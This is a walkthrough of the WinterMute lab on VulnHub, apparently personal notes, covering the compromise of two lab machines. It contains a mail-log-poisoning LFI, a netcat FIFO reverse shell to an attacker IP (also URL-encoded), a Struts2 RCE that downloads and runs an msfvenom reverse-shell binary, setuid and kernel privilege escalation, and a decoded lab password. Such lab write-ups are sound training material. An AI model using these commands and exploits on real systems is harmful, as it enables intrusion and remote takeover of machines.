---
tags:
  - box
platform: VulnHub
os: Linux
difficulty:
date_completed:
mitre_attack: T1078, T1190, T1505.003, T1068, T1552.001, T1090
status: rooted
---

## Target

Two machines in this assessment. The first (Stray Light) has two NICs - one external, one internal. The second (Neuromancer) is only reachable from the first. Goal: root the first box, then pivot to root the second.

## Recon

### Discovery

#Nmap

```bash
sudo nmap -oN -sn 192.168.1.0/24
```

#### Findings

Target 1 (Stray Light) - **IP Address: 192.168.1.108**

### Port Scan

#Nmap

```bash
sudo nmap -T4 -O -sV -sC -p- -oA strayLight 192.168.1.108
```

#### Findings

![strayLightNmap](../../Images/WinterMute/strayLightNmap.png)

| Port | Service | Version |
|---|---|---|
| 25 | SMTP | Postfix smtpd |
| 80 | HTTP | Apache httpd 2.4.25 |
| 3000 | HTTP | Apache Hadoop Task Tracker |

Hadoop and httpd versions don't look vulnerable on their own; smtpd might be if a full version can be pinned down.

The web page shows a glitch-effect image, then redirects to a message being typed onto the screen after a moment.

![homePage](../../Images/WinterMute/homePage.png)
![redirectedMessage](../../Images/WinterMute/redirectedMessage.png)

No comments in source on either page. Ran dirb variations:

```bash
dirb http://192.168.1.108
dirb http://192.168.1.108 /usr/share/usr/wordlists/dirb/big.txt
dirb http://192.168.1.108 -X .txt,.py,.php,.perl,.bak
dirb http://192.168.1.108 /usr/share/wordlists/dirb/big.txt -X .txt,.py,.php,.perl,.bak
dirb http://192.168.1.108 /usr/share/wordlists/dirb/vulns/apache.txt
```

Only found the Apache manual page - worth noting given the specific Apache version.

![apacheManualPage](../../Images/WinterMute/apacheManualPage.png)

```bash
sudo nmap --script=*hadoop* -p 3000 192.168.1.108
sudo nmap --script=*smtp* -p 25 192.168.1.108
```

Hadoop scripts returned nothing useful. SMTP scripts confirmed it's not an open relay, not vulnerable to CVE-2010-4344, and RCPT returns an unhandled status code. Need a username to try other SMTP-based login methods.

![hadoopLogin](../../Images/WinterMute/hadoopLogin.png)

## Enumeration

The "hadoop" page is actually an ntopng login screen, with a hint that default creds are admin/admin.

![hadoopLoggedIn](../../Images/WinterMute/hadoopLoggedIn.png)

Logged in with the default creds - ntopng version 2.4.180512, which searchsploit flags as vulnerable (not confirmed for this exact patch level yet).

![ntopngVersion](../../Images/WinterMute/ntopngVersion.png)

Viewed all users on the page - only the admin account exists.

![ntopngUsers](../../Images/WinterMute/ntopngUsers.png)

```bash
telnet 192.168.1.108 25
```
```smtp
vrfy wintermute
```

Confirmed a valid SMTP username: `wintermute`.

![vrfyWintermuteUser](../../Images/WinterMute/vrfyWintermuteUser.png)

Watching ntopng's traffic view, saw a hit for "turing-bolo" on localhost port 80. Navigated there.

![activeFlowsNtopng](../../Images/WinterMute/activeFlowsNtopng.png)
![turing-BoloPage](../../Images/WinterMute/turing-BoloPage.png)
![boloCase](../../Images/WinterMute/boloCase.png)

Selecting "case" from a list returned case info; other entries in the list:

![boloMolly](../../Images/WinterMute/boloMolly.png)
![boloArmitage](../../Images/WinterMute/boloArmitage.png)
![boloRiviera](../../Images/WinterMute/boloRiviera.png)

Another entry, "freeside," led to a separate page with just an image.

![freesidePage](../../Images/WinterMute/freesidePage.png)

Noticed the "turing-bolo" page is a PHP script pulling per-person data via a `case` URL parameter, while other entries used `name.log` - suggesting it's reading log files by name. Possible LFI/path traversal.

![turingPagePHPParameter](../../Images/WinterMute/turingPagePHPParameter.png)

Tried `/etc/passwd` directly in the parameter - no luck; the script appears to append `.log` automatically. Tried a known log path instead, `/var/log/mail`, and got a response.

![mailLogFile](../../Images/WinterMute/mailLogFile.png)

## Exploitation

With log-file read access confirmed, the plan became log poisoning via the SMTP `telnet` connection - inject PHP into the mail log, then have the LFI-like script execute it.

Found a similar remote command injection exploit for a different Postfix SMTP version in searchsploit - not an exact version match, but close enough in behavior to adapt. That script builds a message sent to the server to land in the logs; since the server runs PHP, crafted a PHP snippet looking for a `CMD` parameter to run arbitrary commands.

![remoteCodeInjectionScript](../../Images/WinterMute/remoteCodeInjectionScript.png)
![sendingCodeToSmtpLog](../../Images/WinterMute/sendingCodeToSmtpLog.png)

Plain `sh` and URL-encoded reverse shell attempts didn't work - eventually succeeded with a URL-encoded netcat FIFO reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.85 4444 >/tmp/f
```
```urlencoded
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.1.85%204444%20%3E%2Ftmp%2Ff
```

![reverseShellCaught](../../Images/WinterMute/reverseShellCaught.png)

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Got a TTY, read `/etc/passwd` - two more users: `wintermute`, `turing-police`.

![etcPasswdStraylight](../../Images/WinterMute/etcPasswdStraylight.png)

Both home directories were otherwise empty. Checked for unusual setuid binaries: `ping` and `screen-4.5.0` stood out.

![UIDSet](../../Images/WinterMute/UIDSet.png)

## Privilege Escalation (Stray Light)

Screen 4.5.0 has a known root exploit (https://www.exploit-db.com/exploits/41154). Copied it to the attack machine, served it with Python's HTTP server, and transferred it over.

![screenKillerFile](../../Images/WinterMute/screenKillerFile.png)
![httpServerStart](../../Images/WinterMute/httpServerStart.png)
![fileTransferStraylight](../../Images/WinterMute/fileTransferStraylight.png)

Ran the script - got a root shell.

![screenKillerRunning](../../Images/WinterMute/screenKillerRunning.png)

## Flags

**Root (Stray Light):** captured.

![strayLightRootFlag](../../Images/WinterMute/strayLightRootFlag.png)

---

## Pivot: Neuromancer

With root on Stray Light, looked for the next target/subnet.

```bash
ifconfig
```

![strayLightIfconfig](../../Images/WinterMute/strayLightIfconfig.png)

Second NIC on 10.0.2.0/24, assigned 10.0.2.4. ARP table showed 10.0.2.3 - not confirmed as the target yet. Ran a ping sweep to populate the ARP table further.

![strayLightArpTable](../../Images/WinterMute/strayLightArpTable.png)

```meterpreter
run post/multi/gather/ping_sweep rhosts=10.0.2.0/24
```

![strayLightPingSweep](../../Images/WinterMute/strayLightPingSweep.png)

New ARP entries revealed the actual target: **IP Address: 10.0.2.5**

![strayLightUpdatedArpTable](../../Images/WinterMute/strayLightUpdatedArpTable.png)

## Recon (Neuromancer)

A note left in Stray Light's root directory mentions an open API on this next system.

![strayLightNote](../../Images/WinterMute/strayLightNote.png)

```meterpreter
run autoroute -s 10.0.2.0/24
```

Open ports found: 8009, 8080, 34483.

```meterpreter
portfwd add -l 10000 -p 8009 -r 10.0.2.5
```
```bash
sudo nmap -sV -sC -p 10000-10002 127.0.0.1
```

| Port | Service | Version |
|---|---|---|
| 8009 | snet-sensor-mgmt | not found |
| 8080 | scp-config | not found |
| 34483 | ssh | OpenSSH 7.2p2 |

Since the note mentioned an HTTP server, and 34483 is SSH, needed to identify 8009/8080 manually.

![strayLightNetcatPorts](../../Images/WinterMute/strayLightNetcatPorts.png)

```bash
nc -nv 10.0.2.5 8009
nc -nv 10.0.2.5 8080
```

8080 is the HTTP server (version unclear from netcat alone). The Meterpreter port forward didn't let me reach the noted directory, so used socat instead:

```bash
socat tcp-listen:5555,fork tcp:10.0.2.5:8080
```

![neuromancerTomcatPage](../../Images/WinterMute/neuromancerTomcatPage.png)

Apache Tomcat running (exact version still unclear). Navigated to the directory from the note: `/struts2_2.3.15.1-showcase`.

![neuromancerStrutsShowcasePage](../../Images/WinterMute/neuromancerStrutsShowcasePage.png)

Struts version 2.3.15 - searchsploit has an RCE for Struts 2.3.x showcase, and this is exactly that showcase app.

![neuromancerStrutsVulnerabilitySearch](../../Images/WinterMute/neuromancerStrutsVulnerabilitySearch.png)

## Exploitation (Neuromancer)

The exploit takes a URL and a command, exploiting how the page builds Java processes. Tried a socat relay for a reverse shell:

```bash
socat tcp-listen:4443,fork tcp:192.168.1.85:4443
```

Several reverse shell payload attempts failed to connect - switched to a compiled msfvenom payload instead:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4443 -f elf -o revShell
```

```bash
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget -O /tmp/revShell 10.0.2.4:4443/revShell"
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/revShell"
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "/tmp/revShell"
```

Got a session back as user `ta`.

![neuromancerIDPasswd](../../Images/WinterMute/neuromancerIDPasswd.png)

`/etc/passwd` shows two accounts: `ta` and `lady3jane`. Logged in as `ta` but without a password, privileges are unclear.

Found `ai-gui-guide.txt` in ta's home directory, revealing install locations worth searching for credentials.

![neuromancrAiGuide](../../Images/WinterMute/neuromancrAiGuide.png)

Found lady3jane's password, encoded, inside the Tomcat files.

![lady3janePasswordEncoded](../../Images/WinterMute/lady3janePasswordEncoded.png)

Decoded: `>!Xx3JanexX!<`

Logged in as lady3jane - no sudo rights either. Setuid-based privesc paths exist but need sudo access to leverage.

![neuromancerSetUID](../../Images/WinterMute/neuromancerSetUID.png)

## Privilege Escalation (Neuromancer)

LinPEAS flagged both a vulnerable sudo version and a vulnerable kernel version.

![neuromancerSudoAndKernelVersion](../../Images/WinterMute/neuromancerSudoAndKernelVersion.png)

The sudo exploit needs ta's password, which isn't available. The kernel LPE, however, doesn't need a password. No C compiler on the target, so compiled statically on the attack machine:

```bash
gcc -static -o privEsc 44298.c
```

Transferred with scp over an SSH session through the socat tunnel, and ran the exploit.

## Flags

**Root (Neuromancer):** captured.

![neuromancerRootShell](../../Images/WinterMute/neuromancerRootShell.png)
![neuromancerRootFlag](../../Images/WinterMute/neuromancerRootFlag.png)

## Lessons Learned

This box chained two very different exploitation styles: SMTP log poisoning (crafting a message so it lands in a log file the web app then executes as PHP) to root the first host, then a full Metasploit-based pivot (autoroute + portfwd/socat) to reach and root a second, internal-only host via a Struts2 showcase RCE. Worth remembering for future pivots: if Meterpreter's own `portfwd` won't reach a service, `socat` run from the already-compromised host is a solid fallback relay.
